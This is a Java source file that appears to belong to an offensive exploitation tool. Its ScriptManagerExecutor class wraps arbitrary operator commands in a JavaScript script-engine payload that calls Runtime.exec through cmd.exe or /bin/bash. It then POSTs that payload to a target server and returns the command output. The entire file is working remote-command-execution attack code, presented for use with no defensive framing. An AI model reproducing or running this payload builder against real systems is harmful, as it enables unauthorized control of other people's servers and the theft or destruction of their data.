package com.feihong.executor;

import com.feihong.bean.CommandExecutionResult;
import com.feihong.util.BasicSetting;
import com.feihong.util.WrappedHttpRequest;
import org.omg.PortableInterceptor.SYSTEM_EXCEPTION;

public class ScriptManagerExecutor implements CommandExecutor{
    @Override
    public String getName() {
        return "ScriptManager-JS";
    }

    @Override
    public CommandExecutionResult exec(String command) {
        command = command.replace("\\","\\\\");
        command = command.replaceAll("\n","\\\\n");
        command = command.replaceAll("'","\\\\\'");

        String wrappedCommand;
        if(command.equalsIgnoreCase("ipconfig") || command.trim().equalsIgnoreCase("ifconfig")){
            wrappedCommand = "var a = java.lang.Runtime.getRuntime().exec(\"" + command + "\").getInputStream();out.println(obj.readInputStream(a))";
        }else{
            if(BasicSetting.getInstance().shellPlatform.trim().equalsIgnoreCase("windows")){
                wrappedCommand =  "var strs=new Array(3);strs[0]='cmd.exe';strs[1]='/c';strs[2]='" + command + "';var a = java.lang.Runtime.getRuntime().exec(strs).getInputStream();out.println(obj.readInputStream(a))";
            }else{
                wrappedCommand = "var strs=new Array(3);strs[0]='/bin/bash';strs[1]='-c';strs[2]='" + command + "';var a = java.lang.Runtime.getRuntime().exec(strs).getInputStream();out.println(obj.readInputStream(a))";
            }
        }


        return WrappedHttpRequest.post(wrappedCommand);
    }
}
